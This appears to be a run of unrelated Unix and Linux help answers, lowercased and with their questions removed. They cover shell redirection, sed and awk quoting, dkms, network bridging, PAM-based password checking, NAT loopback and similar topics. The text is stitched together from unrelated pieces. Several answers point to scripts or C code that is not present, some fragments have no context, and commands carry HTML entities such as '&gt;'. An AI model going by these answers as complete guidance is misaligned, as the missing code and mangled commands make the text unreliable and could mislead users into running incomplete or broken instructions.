apparently this issue has nothing to do with android . we have tested with our custom linux version and we have still the same problem : ftrace produces milliseconds precision while other tools are able to produce microseconds precision . maybe a ftrace module version problem ? regards ,
shbot is a very nice irc bot used for the #bash freenode channel . you can ask it to run bash code for you : /privmsg shbot echo test  it should be relatively easy to adapt this to work with a static web page .
from the latest version of the kill ( 2 ) manpage : for a process to have permission to send a signal to a process designated by pid , the user must be the super-user , or the real or saved user id of the receiving process must match the real or effective user id of the sending process . a single exception is the signal sigcont , which may always be sent to any process with the same session id as the sender . in addition , if the security . bsd . conservative_signals sysctl is set to 1 , the user is not a super-user , and the receiver is set-uid , then only job control and terminal control signals may be sent ( in particular , only sigkill , sigint , sigterm , sigalrm , sigstop , sigttin , sigttou , sigtstp , sighup , sigusr1 , sigusr2 ) . in what sense do you own the process ? what exactly is the status of the process relating to real uid , effective uid , what binary it is running , owner and setid-bits of that binary , etc ?
try doing this in a shell : to test on STDOUT : column -t file.txt  to modify the file : column -t file.txt &gt; new_file.txt &amp;&amp; mv new_file.txt file.txt  as you can see , that is all you need . it saves you a lot of time playing with complicated printf tricks .
the script below does the following , i think this is what you wanted : if a contig from file1 is not present in file2 , print all lines of that contig . if it is present in file2 , then for each value from file1 , print it only if it is not less than any of that contig 's values from file2 -10 or greater than any of file2 's values +10 . save this in a text file ( say foo.pl ) , make it executable ( chmod a+x foo.pl ) and run it like this : ./foo.pl file1 file2  on your example , it returns : $ foo.pl file1 file2 Contig2 68 Contig3 102 Contig7 79 
google it and you come up with plenty links ( check out this one , for instance https://groups.google.com/forum/#!topic/open-iscsi/s3ps_mqzd_k ) if you do not know what iscsi is ( basically , scsi over the wire : low level access to network disks ) chances are good you will not be using it any time soon so you can remove/stop all the related cruft .
sestatus is showing the current mode as permissive . in permissive mode , selinux will not block anything , but merely warns you . the line will show enforcing when it is actually blocking . i do not believe it is possible to completely disable selinux without a reboot .
are you speaking about new generation of ssd that work like sata-hd ? if yes , the answer to your ask is clearly yes , out of the box ! the procerure is rightly the same as another disk . align to 32bits ? this urban legend came from old bios who do not know other than hd , floppies , cdrom and so-called zip-drive . for booting on this kind of bios with usb devices ( removable media bigger than 1,44mo or 2.88mo : zip drive geometry permit 100mo or 250mo ) , as live USB have to be installed on a removable media a nice script was built for reproduce the crapy geometry of a zip-drive . misunderstanded , this made some confusion because first live-cd was always using this script forcing a bad geometry for the case the usb key would be used on a very old bios . ( but in fact , this is not a linux restriction : others recent os will not even be able to boot in such very old machines ; - ) nothing to see with recent linux using recents ssds on recents bios . i have personly buy a 120go ssd to put them in an old laptop . . . speed is wonderful ! nota : as debian try to stay essentialy usefull , minimal installation must be able on very old systems ( installation on a 486dx seem alway possible , but i am not sure . . . i can not do the test . but for info , my personal web server run in a vz container powered by an old dell laptop with a piii copermine @500mhz ) .
your problem is not too few versions of git available , but too many ; git is in the base/updates repo set , but a newer version is also in epel , and they are treading on each other 's feet . you also appear to have an old version of the epel repo wired in ( it is picking up .el5 packages ) , and that definitely will not be helping . try yum install git --disablerepo=epel  which should get you get 1.7.1 . if that works , you might also want to fix your epel repo ( it is in /etc/yum.repos.d/epel.repo ) and to look into repository prioritisation , which helps prevents newer versions of tools ( usually from add-on repos ) from treading on older versions ( from core repos ) unless you specifically ask for them to do so .
if you take a look at the ansi ascii standard , the lower part of the character set ( the first 32 ) are reserved " control characters " ( sometimes referred to as " escape sequences" ) . these are things like the nul character , life feed , carriage return , tab , bell , etc . the vast majority can be emulated by pressing the ctrl key in combination with another key . the 27th ( decimal ) or \033 octal sequence , or 0x1b hex sequence is the escape sequence . they are all representations of the same control sequence . different shells , languages and tools refer to this sequence in different ways . its ctrl sequence is ctrl - [ , hence sometimes being represented as ^[ , ^ being a short hand for ctrl . you can enter control character sequences as a raw sequences on your command line by proceeding them with ctrl - v . ctrl - v to most shells and programs stops the interpretation of the following key sequence and instead inserts in its raw form . if you do this with either the escape key or ctrl - v it will display on most shells as ^[ . however although this sequence will get interpreted , it will not cut and paste easily , and may get reduced to a non control character sequence when encountered by certain protocols or programs . to get around this to make it easier to use , certain utilities represent the " raw " sequence either with \033 ( by octal reference ) , hex reference \x1b or by special character reference \e . this is much the same in the way that \t is interpreted as a tab - which by the way can also be input via ctrl - i , or \\n as newline or the enter key , which can also be input via ctrl - m . so when gilles says : 27 = 033 = 0x1b = ^ [ = \e he is saying decimal ascii 27 , octal 33 , hex 1b , ctrl - [ and \e are all equal he means they all refer to the same thing ( semantically ) . when demizey says ^ [ is just a representation of escape and \e is interpreted as an actual escape character he means semantically , but if you press ctrl - v ctrl - [ this is exactly the same as \e , the raw inserted sequence will most likely be treated the same way , but this is not always guaranteed , and so it recommended to use the programmatically more portable \e or 0x1b or \033 depending on the language/shell/utility being used .
kiss and use the +nottlid option ? man dig . you should really check out the documentation . for example , you can tell dig to only print the relevant info , so that grepping is not necessary .
a related serverfault question describes how to restore package conffiles if you have removed them , and requires that you track down the actual .deb file . all you need to do : find the list of conffiles provided by the package : dpkg --status &lt;package&gt;  ( look under the Conffiles: section ) . remove those conffiles yourself . reinstall the package . if you have found the .deb file , dpkg -i --force-confmiss &lt;package_deb&gt;.deb  alternatively , passing the dpkg option via apt should work : apt-get install --reinstall -o Dpkg::Options::="--force-confmiss" &lt;package&gt; 
you would do something along the lines of : sed '/&lt;!--/,$!d;/--&gt;/q'  the first command deletes all lines but from the first matching &lt;!-- onwards . and among those that have not been deleted by the first command , we search for the closing tag and quit ( after having printed that line as well ) . with perl , to strip the comment tags : perl -ln0777 -e 'print $1 if /&lt;!--\s*(.*?)\s*--&gt;/' 
there are some occasions when bash creates a new process , but the old value of $$ is kept . try $BASHPID instead .
yes , there is a difference . /home/user/script.sh &gt;&gt; /home/user/stdout_and_error.log 2&gt;&amp;1  this will send both stdout and stderr to /home/user/stdout_and_error.log . /home/user/script.sh 2&gt;&amp;1 &gt;&gt; /home/user/stdout_and_error.log  this will send stdout to /home/user/stdout_and_error.log , and stderr to what was previously stdout . &nbsp ; when you perform a shell redirection , the left side of the redirection goes to where the right side of the redirection currently goes . meaning in 2&gt;&amp;1 , it sends stderr ( 2 ) to wherever stdout ( 1 ) currently goes . but if you afterwards redirect stdout somewhere else , stderr does not go with it . it continues to go wherever stdout was previously going . this is why in your first example , both stdout and stderr will go to the same place , but in the second they wont .
of course it is doable : scp file user@host: ssh user@host path_to_script scp user@host:file_to_copy ./  and that is it . . . but there is one problem : you will be asked for password three times . to avoid that you could generate ssh keys and authorize users by these keys . to generate ssh keys run ssh-keygen -t rsa , answer questions and copy public key to remote host ( machine b ) to ~/.ssh/authorized_keys file . private key should be saved in ~/.ssh/id_rsa on local machine ( a ) .
i believe the command you are looking for is dkms status . for example : % dkms status virtualbox, 4.1.18: added  on another system that has a lot more dkms modules installed : more info on dkms is here in it is man page .
a " name server timeout " indicates that the name "mycompany.com" can not resolve . what happens if you do a ping mycompany.com ( note : because of MX records , a failed ping does not mean it is impossible for mail to go there ) while not quite the same as doing a ping text , what does host mycompany.com give you ? some other useful information can be gleamed from grep hosts /etc/nsswitch.conf
the instructions to disable xdm/kdm/gdm/whichever-dm-you-have is correct . if you do not do this , you boot to a graphical login ( that is the dm = display manager ) , and then whenever you quit x ( which should be as easy as ctrl-alt-backspace -- try it , but close your apps first ) , the dm will respawn another graphical login , making it impossible to escape the gui . another possibility with debian is to check in /etc/rc[N].d for a runlevel which does not start the dm , and make that the initdefault in /etc/inittab . i do not have an unmodified debian system at hand , so i can not say which if any that will be -- possibly 2 . do not choose 0 , 1 , or 6 . once the dm is disabled , you boot to a login console . from there you can start x with the command startx . this includes a default de and if you have been using gnome that will probably be it . you can also create an ~/.xinitrc , which is a shell script which will be run in place of the default . generally they can be pretty minimal , eg : #!/bin/sh exec gnome-session  should start gnome ( i believe -- i do not have a gnome system at hand either ) . note that you can not run a gui application without x ; it is not clear from your post you understand that . gui programs are actually clients that need the xorg server to work . you can start a bare x with no de or wm and a specific application by replacing the exec gnome-session line with the name of the application , but beware you will then have no way to start anything else and when you close that application , you will be looking at a blank screen with a cursor floating in it . there is nothing dangerous in all this and it is easy to re-enable the dm if you want .
i found no reliable way to detect if the internet connection is down , other than periodically pinging a bunch of external hosts that are known to be up most of the time . ( the status of the interface is up all the time ) . to know whether your link is active , send an icmp echo request ( also known as " ping" ) to a known-reliable host at the other end of the link you are trying to test . usually this will be the isp 's default gateway , but there are other possibilities . if you cannot use the isp 's default gateway for such testing , i would suggest targetting your isp 's dns servers ; if they are down , things are pretty bad anyway and if you do not need for this to be 100% accurate , that is probably good enough . remember ip is best-effort only , and icmp does not have tcp 's connection-oriented nature and guarantees . do not flood a host with pings unless you have a mutual agreement with the administrator of the remote system . once every 30 seconds is probably quite enough , possibly increasing when the link is detected as down and decreasing during periods of low use such as during the night . the interval should be chosen based on how quickly you want to respond to a link-down situation and what the remote server 's administrator is likely to tolerate . more than one ping every few seconds is almost certainly over the top , and if you do not need an " immediate " response to a link-down situation there is nothing saying you can not test once every few minutes or even more seldom . what tool should i use for redirection ? iptables ? something else ? since you are talking about putting up a web page when the link is down , i suspect that you are mostly concerned with web browsing . when browsing the web , using ip addresses directly is the exception . so set up a local caching dns resolver , and point your clients to it . set it to forward to your isp 's dns servers , or set it to go out and fetch answers on its own based on root hints , that is up to you . when the link fails , swap out the configuration for the local dns server for one that is authoritative for the root zone . and answers any A ( and possibly AAAA ) queries to it with the ip address of your local web server , and issue a configuration reload command . make sure the local web server is not differentiating based on the requested host name ( put the web page in question on the default virtual host ) . you had have something like the following in a bind configuration that gets swapped in when you detect a link failure : zone "." { type master; file "failed-connection.root.zone"; };  and then in failed-connection.root.zone you had have : $ORIGIN . $TTL 10 @ SOA &lt;your SOA record details here&gt; * A 192.168.9.10 * AAAA fe80:123:45::1  make sure to use a short ttl ( i used 10 seconds in the above example ) to avoid inadvertant caching of the " failure " response . also make sure to use ip addresses that do not depend on external connectivity . ( strictly speaking fe80::/16 is deprecated , but it is good enough for illustrative purposes . ) the " link down detected " script may also need to flush the dns server 's cache . also , make very sure that this does not leak onto the internet . in bind 9 , make good friends with the views feature ; with other software , investigate alternatives before making something like this live . when you detect the link coming back up , just put back the original bind ( or other dns server ) configuration file and issue another configuration reload command and possibly cache flush . you could of course use e.g. iptables with pre-routing address rewriting , but then you had risk needing something that can handle basically anything anyone might want to throw at anything on the internet , for marginal additional utility . to me , doing it that way does not seem worth the potential trouble .
you may try to use alt-^ in emacs mode ( it is similar to ctrl-alt-e , but it should do only history expansion ) . if it does not work for you ( for example , there is no default binding for history expansion in vi mode ) , you can add the binding manually by placing bind '"\e^": history-expand-line'  somewhere in your . bashrc , or "\e^": history-expand-line  in your . inputrc update . pair remarks : if everything is ok , you should be able to press alt-^ to substitute any !! sequence with your previous command , for example echo "!!" would become echo "previous_command with args" if it does not work as desired , you can check the binding with bind -P | grep history-expand ( it should return something like history-expand-line can be found on "\e^" )
this seems to do the trick , adding an optional . to the capture : PROMPT_COMMAND='pwd2=$(sed "s:\(\.\?[^/]\)[^/]*/:\1/:g" &lt;&lt;&lt;$PWD)' PS1='\u@\h:$pwd2\$ '  and for the ' even better': PROMPT_COMMAND='pwd2=$(sed -e "s:$HOME:~:" -e "s:\(\.\?[^/]\)[^/]*/:\1/:g" &lt;&lt;&lt;$PWD)' PS1='\u@\h:$pwd2\$ ' 
you need to escape $ in double quotes , bash -c "netstat -tnlp 2&gt;/dev/null | grep ':10301' | grep LISTEN | awk '{print \$7}' | cut -d'/' -f1 | xargs -i -n1 cat /proc/{}/cmdline"  in your case , $7 is interpreted as a parameter . so awk will run {print} which prints the whole line instead of the intended field .
scp will read your ~/.ssh/config and /etc/ssh/ssh_config . as long as you scp to/from the name of one of the host aliases in your ssh config , it should work . since that seems sort of short to be an answer , here 's some more info with things you can do with your ssh config . . . here 's a post that describes some of the advanced features of the ssh config file : http://magazine.redhat.com/2007/11/27/advanced-ssh-configuration-and-tunneling-we-dont-need-no-stinking-vpn-software/ need to tunnel ssh/scp through an http proxy ? no problem , just use the steps outlined here : http://www.mtu.net/~engstrom/ssh-proxy.php another use of the proxycommand option : http://jasonmc.wordpress.com/2008/04/16/ssh-magic/
this will highly depend on what is happening on the system besides your elisp program running , because the bash program ( and all required libs ) may or may not be cached at that moment in time . same goes for awk . in the case where you call bash from bash , the bash must already have been loaded into memory .
you can change the led behavior in files under the /sys directory like /sys/class/net/wlan0/device/leds/*/ . so you can backup those files before changing anything and erase the content of the trigger file under the transmission , reception and association directory .
the actual message shows up as an attachment as well , so you can save it from the attachment list . from either the index or the message itself , hit v to open the attachments and s to save
i actually did this on my freebsd box - so yes , it is possible , but of course you should take care to verify that sudo works properly before you do so ; - ) sudo su will not work anymore , but you can still do sudo bash to get a root shell .
any recent distribution should support text labels and all support numeric labels ( eth0:0 for example ) . maybe some scripts/utilities will have issues when they expect a number and find a text label after the colon . also the start-up scripts support network configuration with the labels . labels ( alias interfaces ) can be setup also with plain old ifconfig ( not only the ip command ) . for your question regarding changing of the ips , there are several possibilities : use text labels use numeric labels ( eth0:0 , eth0:1 , . . . ) and remember which number corresponds to which network ; i think the effect is the same for both text and numeric labels find the correct interface in the script by the network address ( assuming each labeled interface will belong only to one network ) ; this is the most correct option in my opinion
yes , of course you have to : rsync -e 'ssh -p 222' ...  or : RSYNC_RSH='ssh -p 222' rsync ...  alternatively , you can specify in ~/.ssh/config that ssh connections to that host are to be on port 222 by default : Host that-host Port 222 
the discard ( ~ ) action may help . http://www.rsyslog.com/doc/rsyslog_conf_actions.html
method 1: i do not like simply because in 2 seconds of thinking about it those comments are essentially correct . you are creating a surface that exposes your /etc/shadow file , whether it is exploitable or not , i simply do not like that having to do that . method 2: is also bad . encoding passwords in a file is just dumb . passing them through a pipe seems equally dangerous . method 3: is probably the way i would go , and i do not think you had have to write your own solution from scratch . in a couple of minutes of googling i found this implementation that someone put together using the libpam api . c implementation pam authentication for fun and profit excerpt of c implementation - pam . c command to compile it $ gcc -g -lpam -o chkpasswd pam.c  example run $ ./chkpasswd myusername mypassword  i would imagine that with a little effort this approach could be adapted to suit your needs with horde . php implmentation as another alternative to this approach you could potentially roll your own in php . i found this pam library on the pecl website that looks like what you had want . http://pecl.php.net/package/pam i would also take a look at how the moodle project does it . it is discussed here . tips on configuring moodle w/ pam kerberos pam from a security perspective looking at the purpose of pam i would expect that the api interface was designed so that no access to lower level entities , such as the /etc/shadow , would need to be required so that users of the api can use it . this is discussed a bit on the gentoo wiki in this article titled : pam , section : how pam works . exerpt from how pam works so when a user wants to authenticate itself against , say , a web application , then this web application calls pam ( passing on the user id and perhaps password or challenge ) and checks the pam return to see if the user is authenticated and allowed access to the application . it is pams task underlyingly to see where to authenticate against ( such as a central database or ldap server ) . the strength of pam is that everyone can build pam modules to integrate with any pam-enabled service or application . if a company releases a new service for authentication , all it needs to do is provide a pam module that interacts with its service , and then all software that uses pam can work with this service immediately : no need to rebuild or enhance those software titles . method 4: also a good alternative . there should be good accessibility to libraries and such to make the calls necessary to access something like ldap over the wire to do your authentication for you . an ldap server could also be setup on the same system as the horde installation , configuring it for just horde 's use . this would gain you access to the underlying system 's authentication , potentially , by " wrapping " it in an ldap service for horde to consume . references pam authentication for fun and profit linux pam guides pam tutorial ( this is fairly useful ) pam fedora guide
get rid of the dot . valid awk function names consist of a sequence of letters , digits and underscore , and do not begin with digit .
there is a worm going around for an exim4 vulnerability in debian : http://blog.bytemark.co.uk//2010/12/12/fresh-worm-food
release candidate . by convention , whenever an update for a program is almost ready , the test version is given a rc number . if critical bugs are found , that require fixes , the program is updated and reissued with a higher rc number . when no critical bugs remain , or no additional critical bugs are found , then the rc designation is dropped .
it is not possible to connect to a port-forwarded public ip address from inside the same lan . to explain this , i will need an example . let 's suppose your router 's private ip is 192.168.1.1 with public ip 10.1.1.1 . your server is on 192.168.1.2 port 2222 . you set up port forwarding from 10.1.1.1:1111 to 192.168.1.2:2222 . if somebody on the internet ( 10.3.3.3 ) wants to talk to you , they generate a packet : Source: 10.3.3.3 port 33333 Dest: 10.1.1.1 port 1111  your router receives the packet on 10.1.1.1 and rewrites it : Source: 10.3.3.3 port 33333 Dest: 192.168.1.2 port 2222  your server receives that packet and sends a reply : Source: 192.168.1.2 port 2222 Dest: 10.3.3.3 port 33333  your router receives that packet on 192.168.1.1 and rewrites it : Source: 10.1.1.1 port 1111 Dest: 10.3.3.3 port 33333  and the connection works , and everybody is happy . now suppose you connect from inside your lan ( 192.168.1.3 ) . you generate a packet : Source: 192.168.1.3 port 33333 Dest: 10.1.1.1 port 1111  your router receives the packet on 10.1.1.1 and rewrites it : Source: 192.168.1.3 port 33333 Dest: 192.168.1.2 port 2222  your server receives that packet and sends a reply : Source: 192.168.1.2 port 2222 Dest: 192.168.1.3 port 33333  here 's where we hit a problem . because the destination ip is on your lan , your server does not send that packet to the router for rewriting . instead , it sends it directly to 192.168.1.3 . but that machine is not expecting a response from 192.168.1.2 port 2222 . it is expecting one from 10.1.1.1 port 1111 . and so it refuses to listen to this " bogus " packet , and things do not work . the way i get around this is to configure my router ( which also provides dns for my lan ) to return my server 's private ip address when i look up my ddns hostname . that way , when i am on my home network , i connect directly to the server and skip the port forwarding . ( this solution only works when your port forwards are not changing the port number , just the ip address . and you can only have 1 server per public hostname . )
you need to ask qtcreator to load libraries provided by kde , e . g QT_PLUGIN_PATH="$QT_PLUGIN_PATH:/usr/lib/qt4/plugins/:/usr/lib/kde4/plugins" qtcreator if that does not work , try set a different color scheme directly ,
networkmanager can connect you automatically if it is configured to do so . and it comes with most modern distros , such as fedora or ubuntu . i recommend using live usb so that you can retain the configuration between boots .
that is probably a mistake , it is found only in one example on that tutorial . all other examples have copytruncate without the create option . also logrotate man page says that is will be actually ignored : copytruncate truncate the original log file to zero size in place after creating a copy , instead of moving the old log file and optionally creating a new one . it can be used when some program cannot be told to close its logfile and thus might continue writing ( appending ) to the previous log file forever . note that there is a very small time slice between copying the file and truncating it , so some logging data might be lost . when this option is used , the create option will have no effect , as the old log file stays in place . regarding maxage , i think it can be useful for example for logfiles which can be empty for few roration periods ( days/weeks/months ) - if you use notifempty , empty logfile will not be rotated , so you can have too old rotated files still in place .
solving the issue would involve understanding why it is happening . you should start by looking through your logs to see if there are any obvious errors ; begin with /var/log/Xorg.0.log and the lightdm log at /var/log/lightdm/lightdmlog . to avoid having to do the hard shutdown , next time it happens , switch to a console with ctrl alt f1 ( or any of the f_ keys between 1 and 6 ) and login and restart the display manager with : sudo service lightdm restart you can then switch back to the console that X ( your gui ) is running in with ctrl alt f7 where you can log back into your mint desktop .
asynchronous io in freebsd is not totally better than in linux . i think your source meant that aio call family ( aio_read , etc . ) is implemented in freebsd kernel directly but converts its requests to iocps internally where possible ( sockets , pipes , flat disk access , etc . ) and creates kernel threads only for filesystem i/o . unlike this , linux uses userland threads for aio call family which are more explicit but expose their work and need larger thread context . all other aspects are related to common kernel architecture and performance which depends on lots of percularities , including sysadmin tuning skills . there are approaches when threads are explicitly needed for aio - the main case is when a file is memory mapped and reading as memory region , and real reading is handled as page fault . as page fault interrupts a particular control flow ( i.e. . thread ) , it requires separate thread to be handled independently . seems this is very close to your supposed mechanism , but only if you control ram usage properly ; this means at least mass madvise calls for specifying which regions are needed and which are not . sometimes direct *read ( ) /*write ( ) are easier because they do not require keeping already processed segments exposed to ram . aio by itself does not correlate with swap in any manner . using any io manner requires input and output at the best rate . but , the issue is that if you keep huge data amounts in process memory , it will be swapped out and in . if your " working set " ( page set which shall be in ram for working without obvious process ' performance degradation ) is larger than fits in ram ( including spendings for kernel data , disk cache , etc . ) , you will fall into constant swapping . in that case , algorithms shall be adapted to keep working set small enough , that is the only solution . particularly for linux , please keep issue 12309 in mind . it is reported as fixed but the ticket misses imporant part of history and consequences , so , the issue with late disk cache purging and following mass swapping-out can return . the important freebsd difference is that bsd systems never had this issue .
i can not find a good way to do that . what i do is type $PWD before the file name , then press tab to expand it . in bash you may need to press ctrl + alt + e instead of tab . e.g. vi $PWD/000-default  then ctrl + alt + e then enter
sed expects a basic regular expression ( bre ) . \s is not a standard special construct in a bre ( nor in an ere , for that matter ) , this is an extension of some languages , in particular perl ( which many others imitate ) . in sed , depending on the implementation , \s either stands for the literal string \s or for the literal character s . in your implementation , it appears that \s matches s , so \s* matches 0 or more s , and x\s* matches x in your sample input , hence x ax is transformed to x ax ( and xy would be transformed to x y and so on ) . in other implementations ( e . g . with gnu sed ) , \s matches \s , so \s* matches a backslash followed by 0 or more s , which does not occur in your input so the line is unchanged . this has absolutely nothing to do with greediness . greediness does not influence whether a string matches a regex , only what portion of the string is captured by a match .
that yields only these results : A999 A1000 1001 
this probably happens due to dns , and the machine ( or individual services ) are waiting onbeing able to resolve hostnmaes during the boot process . the most likely culprit is actually your own machine 's hostname . to avoid this problem , make sure you have your machine 's hostname listed in /etc/hosts like this : 127.0.0.1 localhost hostname 
start by apt-get uninstall networkmanager on the server . possibly you need to install the bridge-utils package , but i am not sure if it is needed ( can not hurt ) . then set up bridging to make the two network server interfaces act like one ( and forward everything ) , by editing the /etc/network/interfaces file ( assuming your wireless router 's ip is 192.168.1.1 ) : auto br0 iface br0 inet static bridge_ports eth0 eth1 address 192.168.1.5 netmask 255.255.255.0 network 192.168.1.0 gateway 192.168.1.1  now that the server is not using dhcp to get network information , you need to configure the nameserver manually in the /etc/resolv.conf file : nameserver 8.8.8.8  the " pc conn . to tv " should then be able to get an ip address via dhcp from your router . ( you can tweak the setup on the server to use dhcp too , if you configure the wireless router to always give your server 's mac address the same ip address . then the nameserver will also be configured automatically via dhcp . )
it is just a character class , since you do not have the -r flag set the \ and \ makes a group for latter reference , and \S is just the complementary group for \s , since \s is the group that matches any white-space \S is the group that matches anything but white-space . this means that the regex s/\(\S\)/expect(\1/ adds expect on front of the first non white-space : # echo ' ' | sed "s/\(\S\)/expect(\1/" # echo ' a' | sed "s/\(\S\)/expect(\1/" expect(a  so , i guess that i am trying to say that your script does change the line : ParallelTests.should_not_receive(:sleep)  it must change it :
[[ is bash reserved word , therefore special expansion rules such as arithmetic expansion are applied , not like in case with [ . also arithmetic binary operator -eq is used . therefore shell looks for integer expression and if text is found at the first item it tries to expand it as parameter . it is called arithmetic expansion and is present in man bash . so for example : [[ hdjakshdka -eq fkshdfwuefy ]]  will return always true but this one will return error $ [[ 1235hsdkjfh -eq 81749hfjsdkhf ]] -bash: [[: 1235hsdkjfh: value too great for base (error token is "1235hsdkjfh")  also recursion is available : $ VALUE=VALUE ; [[ VALUE -eq 12 ]] -bash: [[: VALUE: expression recursion level exceeded (error token is "VALUE") 
maybe this example is just extremely oversimplified , but i am having trouble seeing why you would not just run : cp /etc/httpd/conf/httpd.conf /a.txt  that is , there is already a command that simply reads from one file and creates another with its contents , and it is called cp . the only real difference would be if /a.txt already existed and you were trying to retain its permissions , or some such - but even then , you had want to just do : cat /etc/httpd/conf/httpd.conf &gt;/a.txt 
a fork is really a fork . you obtain two almost identical processes . the main difference is the returned value of the fork() system call which is the pid of the child in the one that is identified as parent and 0 in the child ( which is how the software can determine which process is considered the parent ( the parent has the responsibility to take care of its children ) and which is the child ) . in particular , the memory is duplicated , so the fd array will contain the same thing ( if fd[0] is 3 in one process , it will be 3 as well in the other ) and the file descriptors are duplicated . fd 3 in the child will point to the same open file description as fd 3 in the parent . so fd 3 of both parent and child will point to one end of the pipe , and fd 4 ( fd[1] ) of both parent and child will point to the other end . you want to use that pipe for one process to send data to the other one . typically one of the processes will write to fd 4 and the other one will read from fd 3 until it sees end of file . end of file is reached when all the fds open to the other side of the pipe have been closed . so if the reader does not close its fd to the other side , it will never see the end of file . similarly if the reader dies , the writer will never know that it must stop writing if it has not closed its own fd to the other side of the pipe .
the video4linux project keeps lists of supported cards , for example , analog pci-e cards and analog usb devices . linux ( the kernel ) itself has a list of supported tuners under /Documentation/video4linux/CARDLIST.tuner .
if you want to open the whole file ( which requires ) , but show only part of it in the editor window , use narrowing . select the part of the buffer you want to work on and press C-x n n ( narrow-to-region ) . say “yes” if you get a prompt about a disabled command . press C-x n w ( widen ) to see the whole buffer again . if you save the buffer , the complete file is selected : all the data is still there , narrowing only restricts what you see . if you want to view a part of a file , you can insert it into the current buffer with shell-command with a prefix argument ( M-1 M-! ) ; run the appropriate command to extract the desired lines , e.g. &lt;huge.txt tail -n +57890001 | head -n 11 . there is also a lisp function insert-file-contents which can take a byte range . you can invoke it with M-: ( eval-expression ) : (insert-file-contents "huge.txt" nil 456789000 456791000)  note that you may run into the integer size limit ( version- and platform-dependent , check the value of most-positive-fixnum ) . in theory it would be possible to write an emacs mode that loads and saves parts of files transparently as needed ( though the limit on integer sizes would make using actual file offsets impossible on 32-bit machines ) . the only effort in that direction that i know of is vlf ( github link here ) .
first , go to the xfce4 settings panel , then select session and startup , then select the session tab . then find the xfwm4 entry and change its restart style to never . then you can kill it .
it seems applying a command line argument to a bsub file is a very complicated process . i tried the heredoc method stated by mikeserv , but bsub acted as if the script filename was a command . so the easiest way to get around this problem is just to not use input redirection at all . since my question specifically involved bsub for platform lsf , the following is probably the best way to solve this sort of argument problem : to pass an argument to a script to be run in bsub , first specify all bsub arguments in the command line rather than in the script file . then to run the script file , use "sh script.sh [arg]"  after all of the bsub arguments . thus the entire line will look something like : bsub -q [queue] -J "[name]" -W 00:10 [other bsub args] "sh script.sh [script args]"  in this case , it is better to not use . bsub files for the script and use a normal . sh script instead and use the unix sh command to run it with arguments .
you should issue the command :  chroot /chroot_dir /bin/bash -c "su - -c ./yourscript.sh" 
yes this is a symbolic link . you can try something like below . bash-3.2$ mkdir a bash-3.2$ ln -s a b bash-3.2$ ls -al b lrwxrwxrwx 1 ramesh ramesh 1 May 28 19:10 b -&gt; a  b is a symbolic link pointing to a . difference between a symbolic link and hard link a file in the file system is basically a link to an inode . a hard link then just creates another file with a link to the same underlying inode . when you delete a file it removes one link to the underlying inode . the inode is only deleted ( or deletable/over-writable ) when all links to the inode have been deleted . a symbolic link is a link to another name in the file system . once a hard link has been made the link is to the inode . deleting renaming or moving the original file will not affect the hard link as it links to the underlying inode . any changes to the data on the inode is reflected in all files that refer to that inode . note : hard links are only valid within the same file system . symbolic links can span file systems as they are simply the name of another file . references stackexchange-url
this is not possible , as of htop 0.8.3 . source : the source code . the best you can do is sort processes by user , root 's processes will be conveniently lumped together .
" real time " means processes that must be finished by their deadlines , or bad things ( tm ) happen . a real-time kernel is one in which the latencies by the kernel are strictly bounded ( subject to possiby misbehaving hardware which just does not answer on time ) , and in which most any activity can be interrupted to let higher-priority tasks run . in the case of linux , the vanilla kernel is not set up for real-time ( it has a cost in performance , and the realtime patches floating around depend on some hacks that the core developers consider gross ) . besides , running a real-time kernel on a machine that just can not keep up ( most personal machines ) makes no sense . that said , the vanilla kernel handles real time priorities , which gives them higher priority than normal tasks , and those tasks will generally run until they voluntarily yield the cpu . this gives better response to those tasks , but means that other tasks get hold off .
you are following instructions posted in 2006: posted by sebas on mon 9 oct 2006 at 12:49 makes sense they will be a little out of date : ) . you can probably make this work using netinstall but it will almost certainly not be worth the effort . just get a debian installation iso , burn it onto a cd or a usb stick and install from there ( the instructions are here ) . once you are done , configure your network for wifi .
the hist command is a korn shell ( ksh93 ) builtin , and is not available in bash . your script ( s ) appears to be running under bash , not ksh . ksh$ command -V hist hist is a shell builtin bash$ command -V hist bash: command: hist: not found  try the following : $ ksh myScript -s test -u test2  or : $ SHELL=ksh ksh myScript -s test -u test2  however , hist is a command that is typically only used in interactive mode , and i would not expect it in a script . it is rarely invoked directly , and more often as one of the following aliases : $ alias | grep hist fc=hist history='hist -l' r='hist -s'  look for any of fc , history , r .
/dev/fd/3 seems to be pointing to the current process . ie . , ls itself ( notice that pid will not exist afterward ) . all of those actually pertain to the current process , as file descriptors are not global ; there is not just a single 0 , 1 , and 2 for the whole system -- there is a separate 0 , 1 , and 2 for each process . as frederik dweerdt notes , /dev/fd is a symlink . if you repeat your ls from different terminals , you will notice links to different ptys . these will match the output of the tty command . in the ls example , i would imagine descriptor 3 is the one being used to read the filesystem . some c commands ( eg , open() ) , which underpin the generation of file descriptors , guarantee the return of " the lowest numbered unused file descriptor " ( posix -- note that low level open ( ) is actually not part of standard c ) . so they are recycled after being closed ( if you open and close different files repeatedly , you will get 3 as an fd over and over again ) . if you want a clue about how they come to exist , here 's a snippet of c code using opendir() , which you will probably find in the source for ls : run as is , the fd will be 3 , since that is the lowest unused descriptor ( 0 , 1 , and 2 already exist ) .
that is a really bad idea . every inode consumes 256 bytes ( may be configured as 128 ) . thus just the inodes would consume 1tib of space . other file systems like btrfs can create inodes dynamically . use one of them instead .
following this page , debian support for touchscreen is incomplete/under development . you need to play a lot , and upgrade your debian at least to wheezy ( or maybe jessie ) .
to reduce the escaping to the minimum , i suggest to use single quotes with sed , like in sed 's/pattern/repl/g'  ( in single quotes you can freely use the backtick without any fear and without escaping ) . if you need to use shell variable in the sed script , put together single quotes and double quotes like in the following example var="bbb" thing=foo sed 's/aaa'"${var}"'ccc/some'"${thing}"'else/g'  that could be better seen as the following concatenation 's/aaa' + "${var}" + 'ccc/some' + "${thing}" + 'else/g' 
it is because your root user has a different path . sudo echo $PATH  prints your path . it is your shell that does the variable expansion , before sudo starts ( and passes it as a command line argument , expanded ) . try : sudo sh -c 'echo $PATH' 
